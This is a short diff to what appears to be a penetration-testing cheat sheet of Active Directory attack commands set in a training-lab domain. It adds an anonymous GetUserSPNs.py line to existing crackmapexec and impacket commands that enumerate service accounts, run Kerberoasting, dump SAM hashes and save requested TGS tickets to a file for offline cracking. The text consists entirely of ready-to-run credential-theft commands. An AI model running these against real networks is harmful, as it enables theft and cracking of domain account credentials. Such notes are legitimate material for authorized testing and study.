@@ -14,6 +14,7 @@ crackmapexec ldap dc-ip -u username -p password -M kerberoast --just-dc
 cme ldap dc-ip -u 'domain\user' -p 'pass' --k --sam
 
 # SPN Users Enum and TGS Dump
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/ ( Anonymous )
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
